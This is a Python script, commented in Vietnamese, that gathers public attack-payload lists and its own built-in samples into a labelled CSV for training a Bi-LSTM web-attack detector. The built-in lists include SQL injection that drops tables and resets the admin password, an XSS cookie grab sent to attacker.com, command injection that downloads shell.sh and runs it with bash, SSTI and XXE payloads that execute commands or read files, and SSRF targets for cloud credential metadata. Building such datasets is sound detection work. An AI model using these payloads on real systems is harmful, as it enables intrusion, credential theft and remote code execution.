"""
data_collector.py — Thu thập & phân cụm data tấn công mới
==========================================================
Nguồn: GitHub payload lists công khai (cho mục đích nghiên cứu/học thuật)
Output: data_new_variants.csv — sẵn sàng merge vào pipeline train Bi-LSTM

Cụm:
  SQLi          → classic, union, blind, error-based, json, second-order
  XSS           → reflected, dom, svg, template, encoded
  CMDi          → unix, chaining, substitution, filter-bypass, powershell
  PathTraversal → classic, url-encoded, double-encoded, null-byte, windows
  SSRF          → internal, cloud-metadata, ipv6, redirect, scheme
  CSRF          → form, json, multipart
"""

import requests
import csv
import re
import time
import html
from pathlib import Path

# ── Màu terminal ────────────────────────────────────────────
G="\033[92m"; Y="\033[93m"; C="\033[96m"; R="\033[91m"
DIM="\033[2m"; RESET="\033[0m"; BOLD="\033[1m"

# ════════════════════════════════════════════════════════════
#  NGUỒN DATA — GitHub raw files (công khai, học thuật)
# ════════════════════════════════════════════════════════════
SOURCES = {

    # ── SQLi ─────────────────────────────────────────────────
    "SQLi": [
        # Classic + Union + Boolean
        "https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/detect/Generic_Boolean.txt",
        "https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/detect/Generic_UnionSelect.txt",
        "https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/detect/Generic_ErrorBased.txt",
        # Time-based blind
        "https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/detect/MySQL_TimeBasedBlind.txt",
        "https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/detect/MSSQL_TimeBasedBlind.txt",
        # Auth bypass
        "https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/Auth_Bypass.txt",
    ],

    # ── XSS ──────────────────────────────────────────────────
    "XSS": [
        # Comprehensive XSS list
        "https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt",
        # Portswigger cheat sheet style
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Jhaddix.txt",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-RSNAKE.txt",
    ],

    # ── CMDi ─────────────────────────────────────────────────
    "CMDi": [
        "https://raw.githubusercontent.com/payloadbox/command-injection-payload-list/master/README.md",
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/command-injection-commix.txt",
    ],

    # ── Path Traversal ───────────────────────────────────────
    "PathTraversal": [
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt",
        "https://raw.githubusercontent.com/payloadbox/rfi-lfi-payload-list/master/RFI-LFI-Linux.txt",
    ],

    # ── SSRF ─────────────────────────────────────────────────
    "SSRF": [
        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SSRF/SSRF-InterestingPaths.txt",
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/README.md",
    ],

    # ── CSRF ─────────────────────────────────────────────────
    "CSRF": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/CSRF%20Injection/README.md",
    ],

    # ── SSTI ─────────────────────────────────────────────────
    "SSTI": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/README.md",
    ],

    # ── NoSQLi ───────────────────────────────────────────────
    "NoSQLi": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/NoSQL%20Injection/Intruder/MongoDB.txt",
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/NoSQL%20Injection/Intruder/NoSQL.txt",
    ],

    # ── XXE ──────────────────────────────────────────────────
    "XXE": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XXE%20Injection/Intruders/XXE_Fuzzing.txt",
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XXE%20Injection/Intruders/xml-attacks.txt",
    ],

    # ── JWTAuth ──────────────────────────────────────────────
    "JWTAuth": [
        "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/JSON%20Web%20Token/README.md",
    ],
}

# ════════════════════════════════════════════════════════════
#  CLUSTER RULES — phân loại variant theo pattern
# ════════════════════════════════════════════════════════════
CLUSTER_RULES = {
    "SQLi": {
        "blind_time":    [r"sleep\s*\(", r"waitfor\s+delay", r"pg_sleep", r"benchmark\s*\("],
        "union_based":   [r"union\s+select", r"union\s+all\s+select"],
        "error_based":   [r"extractvalue\s*\(", r"updatexml\s*\(", r"floor\s*\(.*rand"],
        "json_api":      [r'"\s*:\s*".*(?:or|union|select)', r'\{.*sql.*\}'],
        "second_order":  [r"insert\s+into.*values.*select", r"update.*set.*select"],
        "auth_bypass":   [r"'\s*or\s*'1'\s*=\s*'1", r"--\s*$", r"#\s*$", r"or\s+1\s*=\s*1"],
        "classic":       [r"'\s*or\s*", r";\s*select", r"'\s*;"],
    },
    "XSS": {
        "svg_based":     [r"<svg", r"<animate", r"<set\s"],
        "dom_based":     [r"javascript:", r"data:text/html", r"document\.", r"window\."],
        "template":      [r"\{\{.*\}\}", r"\$\{.*\}", r"#\{.*\}"],
        "encoded":       [r"&#x?[0-9a-f]+;", r"%[0-9a-f]{2}", r"\\u[0-9a-f]{4}"],
        "event_handler": [r"on\w+=", r"onerror=", r"onload=", r"onmouseover="],
        "classic":       [r"<script", r"<img\s+src"],
    },
    "CMDi": {
        "powershell":    [r"powershell", r"get-\w+", r"invoke-\w+", r"cmd\.exe"],
        "substitution":  [r"\$\(", r"`[^`]+`", r"\$\{IFS\}"],
        "filter_bypass": [r"%0a", r"\$@", r"\\n", r"<\("],
        "chaining":      [r"&&", r"\|\|", r";\s*\w"],
        "classic_unix":  [r"\|\s*\w", r";\s*cat\s", r";\s*id\b", r";\s*whoami"],
    },
    "PathTraversal": {
        "double_encoded": [r"%252e%252e", r"%25%32%65"],
        "url_encoded":    [r"%2e%2e%2f", r"%2e%2e/", r"\.\.%2f"],
        "null_byte":      [r"%00", r"\x00"],
        "windows_unc":    [r"\.\.[\\\/].*win", r"\.\.\\"],
        "classic":        [r"\.\.\/", r"\.\./.*etc", r"\.\.\/.*passwd"],
    },
    "SSRF": {
        "cloud_metadata": [r"169\.254\.169\.254", r"metadata\.google", r"instance-data"],
        "ipv6":           [r"\[::1\]", r"\[::ffff:", r"0x7f000001"],
        "redirect":       [r"redirect=", r"url=http", r"@.*internal"],
        "scheme":         [r"dict://", r"gopher://", r"file:///", r"ftp://"],
        "internal":       [r"127\.0\.0\.", r"192\.168\.", r"10\.\d+\.\d+", r"localhost"],
    },
    "CSRF": {
        "json_csrf":      [r'content-type.*json', r'\{.*"csrf', r'fetch\('],
        "multipart":      [r"multipart/form-data", r"boundary="],
        "form_based":     [r"<form", r"action=.*transfer", r"method=.*post"],
        "classic":        [],  # fallback
    },
    "SSTI": {
        "jinja2_twig":    [r'\{\{.*\}\}', r'\{%.*%\}'],
        "java_freemarker":[r'\$\{.*\}', r'#\{.*\}', r'\*\{.*\}'],
        "ruby_erb":       [r'<%=.*%>'],
        "expression":     [r'\*7\]', r'7\s*\*\s*7'],
    },
    "NoSQLi": {
        "operator_injection": [r'\$ne', r'\$gt', r'\$lt', r'\$regex', r'\$in'],
        "boolean_bypass":     [r"\|\|", r"&&", r"return\s+true"],
        "where_clause":       [r'\$where'],
    },
    "XXE": {
        "external_entity": [r'<!ENTITY\s+'],
        "doctype":         [r'<!DOCTYPE\s+'],
        "oob_extraction":  [r'http://', r'ftp://', r'gopher://', r'expect://'],
        "file_inclusion":  [r'file://'],
    },
    "JWTAuth": {
        "none_algorithm":  [r'eyJhbGciOiJub25lIn0', r'eyJhbGciOiJOT05FIn0'],
        "stripped_sig":    [r'\.[a-zA-Z0-9_\-]+\.$'],
        "manipulated":     [r'eyJ[a-zA-Z0-9_\-]+'],
    },
}

# ════════════════════════════════════════════════════════════
#  BUILT-IN VARIANTS — các biến thể quan trọng không có online
# ════════════════════════════════════════════════════════════
BUILTIN_VARIANTS = {
    "SQLi": [
        # JSON injection (API REST)
        '{"username": "admin\' OR \'1\'=\'1", "password": "x"}',
        '{"id": "1 UNION SELECT username,password FROM users--"}',
        '{"search": "x\' AND SLEEP(5)--"}',
        # Second-order
        "admin'--",
        "'; DROP TABLE users; INSERT INTO users VALUES('hacker','hacker','admin')--",
        # Blind boolean
        "1' AND (SELECT COUNT(*) FROM users)>0--",
        "1' AND SUBSTRING(username,1,1)='a'--",
        # Filter bypass
        "1'/**/OR/**/1=1--",
        "1' ORder by 1--",
        "1';EXEC(CHAR(115)+CHAR(101)+CHAR(108)+CHAR(101)+CHAR(99)+CHAR(116)+CHAR(32)+CHAR(49))--",
        # Stacked queries
        "1'; INSERT INTO users VALUES('x','x','admin')--",
        "1'; UPDATE users SET password='hacked' WHERE username='admin'--",
    ],
    "XSS": [
        # SVG-based
        "<svg><script>alert(1)</script></svg>",
        "<svg onload=\"fetch('http://attacker.com?c='+document.cookie)\">",
        "<svg><animate attributeName=href values=javascript:alert(1) />",
        # DOM-based
        "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "data:text/html,<script>alert(document.domain)</script>",
        # Template injection (Angular/Vue)
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
        "#{alert(1)}",
        # CSS injection
        "<style>@import'http://attacker.com/steal.css'</style>",
        # mXSS (mutation XSS)
        "<listing><\x00/listing><img/src/onerror=alert(1)>",
        "<!--<img src=\"--><img src=x onerror=alert(1)//\">",
        # Encoded variants
        "<ScRiPt>alert(1)</sCrIpT>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
    ],
    "CMDi": [
        # PowerShell
        "; powershell -c whoami",
        "| powershell Get-Process",
        "; powershell -EncodedCommand dwBoAG8AYQBtAGkA",
        # Substitution bypass
        "127.0.0.1; $(id)",
        "127.0.0.1; `whoami`",
        "127.0.0.1${IFS}&&${IFS}id",
        # Newline bypass
        "127.0.0.1%0aid",
        "127.0.0.1%0a%0dwhoami",
        # Filter bypass tricks
        "127.0.0.1;w'h'o'a'm'i",
        "127.0.0.1;/usr/bin/id",
        "127.0.0.1;c${random}at /etc/passwd",
        # Chaining complex
        "127.0.0.1 && curl http://attacker.com/$(whoami)",
        "127.0.0.1 || wget http://attacker.com/shell.sh -O /tmp/s && bash /tmp/s",
    ],
    "PathTraversal": [
        # URL encoded
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow",
        # Double encoded
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "..%255c..%255cwindows%255cwin.ini",
        # Null byte
        "../../../../etc/passwd%00.jpg",
        "../../../../etc/passwd%00.png",
        # Unicode tricks
        "..%c0%af..%c0%afetc%c0%afpasswd",
        "..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
        # Windows specific
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....\\....\\....\\windows\\win.ini",
        # Absolute path bypass
        "/etc/passwd",
        "/proc/self/environ",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    ],
    "SSRF": [
        # IPv6 & decimal tricks
        "http://[::1]/admin",
        "http://[::ffff:127.0.0.1]/",
        "http://0x7f000001/",
        "http://2130706433/",  # 127.0.0.1 decimal
        # DNS rebinding style
        "http://localtest.me/",
        "http://127.0.0.1.nip.io/",
        # Redirect bypass
        "http://attacker.com/redirect?url=http://169.254.169.254",
        "http://evil.com@127.0.0.1/",
        # Alternative schemes
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:25/_HELO",
        "file:///etc/passwd",
        "ftp://127.0.0.1/",
        # Cloud metadata variants
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.170.2/v2/credentials",  # ECS metadata
    ],
    "CSRF": [
        # JSON CSRF
        '{"to": "attacker", "amount": "9999"}',
        'fetch("/transfer",{method:"POST",body:JSON.stringify({to:"hack",amount:999}),headers:{"Content-Type":"application/json"}})',
        # Multipart
        "Content-Type: multipart/form-data; boundary=csrf\r\n--csrf\r\nContent-Disposition: form-data; name=\"to\"\r\nhacker\r\n--csrf--",
        # Classic form
        "<form action='http://target/transfer' method='POST'><input name='to' value='attacker'><input name='amount' value='9999'></form><script>document.forms[0].submit()</script>",
        "<img src='http://target/transfer?to=attacker&amount=9999'>",
        # Hidden iframe
        "<iframe src='http://target/transfer?to=attacker&amount=9999' style='display:none'></iframe>",
        # CORS misconfiguration
        "Origin: http://attacker.com",
    ],
    "SSTI": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{% set a=1 %}",
        "{{config.items()}}",
        "{{\"\".__class__.__mro__[1].__subclasses__()}}",
        '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
        '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
        '${T(java.lang.Runtime).getRuntime().exec("id")}',
        '*{T(java.lang.Runtime).getRuntime().exec("id")}',
        '${@java.lang.Runtime@getRuntime().exec("id")}'
    ],
    "NoSQLi": [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$ne": 1}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        "admin' || '1'=='1",
        "'; return (true); //",
        '{"$regex": "^admin"}',
        '{"$exists": true}',
        '{"$nin": ["invalid"]}',
        '{"$type": 2}'
    ],
    "XXE": [
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>',
        '<!ENTITY % xxe SYSTEM "php://filter/base64-encode/resource=index.php">',
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
    ],
    "JWTAuth": [
        'eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.',
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ',
        'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.evil_signature'
    ],
}

# ════════════════════════════════════════════════════════════
#  FETCH TỪNG URL
# ════════════════════════════════════════════════════════════
def fetch_payloads(url: str, label: str) -> list[str]:
    try:
        r = requests.get(url, timeout=15,
                         headers={"User-Agent": "Mozilla/5.0 (Security Research)"})
        if r.status_code != 200:
            print(f"  {Y}[!] HTTP {r.status_code}: {url[:60]}{RESET}")
            return []

        lines = r.text.splitlines()
        payloads = []
        for line in lines:
            line = line.strip()
            # Bỏ comment, header markdown, dòng trống
            if not line or line.startswith("#") or line.startswith("//"):
                continue
            if line.startswith("|") or line.startswith("```"):
                continue
            # Decode HTML entities nếu có
            line = html.unescape(line)
            # Chỉ lấy dòng có vẻ là payload (không quá dài, không phải prose)
            if 3 < len(line) < 500:
                payloads.append(line)

        return payloads
    except Exception as e:
        print(f"  {R}[err] {url[:60]}: {e}{RESET}")
        return []

# ════════════════════════════════════════════════════════════
#  PHÂN CỤM VARIANT
# ════════════════════════════════════════════════════════════
def classify_variant(payload: str, label: str) -> str:
    """Phân loại payload vào cụm cụ thể của label."""
    rules = CLUSTER_RULES.get(label, {})
    p = payload.lower()
    for cluster_name, patterns in rules.items():
        for pat in patterns:
            if re.search(pat, p, re.I):
                return cluster_name
    return "classic"

# ════════════════════════════════════════════════════════════
#  DEDUP VÀ CLEAN
# ════════════════════════════════════════════════════════════
def clean_and_dedup(payloads: list[str]) -> list[str]:
    seen = set()
    result = []
    for p in payloads:
        # Normalize whitespace
        p = re.sub(r'\s+', ' ', p).strip()
        # Decode HTML entities
        p = html.unescape(p)
        key = p.lower()
        if key not in seen and len(p) > 3:
            seen.add(key)
            result.append(p)
    return result

# ════════════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════════════
def main():
    print(f"\n{BOLD}{'═'*60}{RESET}")
    print(f"{BOLD}  DATA COLLECTOR — Biến thể tấn công mới cho Bi-LSTM{RESET}")
    print(f"{'═'*60}\n")

    all_rows = []   # (payload, label, variant_cluster)
    stats    = {}

    for label, urls in SOURCES.items():
        print(f"{C}[{label}]{RESET}")
        raw_payloads = []

        # 1. Fetch từ online sources
        for url in urls:
            fetched = fetch_payloads(url, label)
            raw_payloads.extend(fetched)
            print(f"  {DIM}→ {url[-55:]:55s} {G}+{len(fetched)}{RESET}")
            time.sleep(0.3)  # rate limit nhẹ

        # 2. Thêm built-in variants
        builtin = BUILTIN_VARIANTS.get(label, [])
        raw_payloads.extend(builtin)
        print(f"  {DIM}→ built-in variants                                    {G}+{len(builtin)}{RESET}")

        # 3. Clean + dedup
        cleaned = clean_and_dedup(raw_payloads)

        # 4. Phân cụm + thêm vào rows
        cluster_counts = {}
        for p in cleaned:
            cluster = classify_variant(p, label)
            cluster_counts[cluster] = cluster_counts.get(cluster, 0) + 1
            all_rows.append({
                "payload":  p,
                "label":    label,
                "variant":  cluster,
            })

        stats[label] = {"total": len(cleaned), "clusters": cluster_counts}
        print(f"  {G}✓ {len(cleaned)} payload sau dedup{RESET}")
        for c, n in sorted(cluster_counts.items(), key=lambda x: -x[1]):
            print(f"    {DIM}├─ {c:<20} {n}{RESET}")
        print()

    # ── Xuất CSV ────────────────────────────────────────────
    out_path = Path("data_new_variants.csv")
    with open(out_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["payload", "label", "variant"])
        writer.writeheader()
        writer.writerows(all_rows)

    # ── Summary ─────────────────────────────────────────────
    print(f"\n{BOLD}{'═'*60}{RESET}")
    print(f"{BOLD}  TỔNG KẾT{RESET}")
    print(f"{'═'*60}")
    total = len(all_rows)
    for label, s in stats.items():
        print(f"  {label:<16} {s['total']:>5} payloads  "
              f"{DIM}({len(s['clusters'])} cụm){RESET}")
    print(f"  {'─'*40}")
    print(f"  {'TỔNG':<16} {total:>5} payloads")
    print(f"\n  {G}✓ Đã lưu: {out_path}{RESET}")
    print(f"\n  {DIM}Bước tiếp theo:{RESET}")
    print(f"  {DIM}1. Kiểm tra data_new_variants.csv{RESET}")
    print(f"  {DIM}2. Merge vào data_loading_v3.py{RESET}")
    print(f"  {DIM}3. Train lại model với distribution mới{RESET}")
    print(f"{'═'*60}\n")


if __name__ == "__main__":
    main()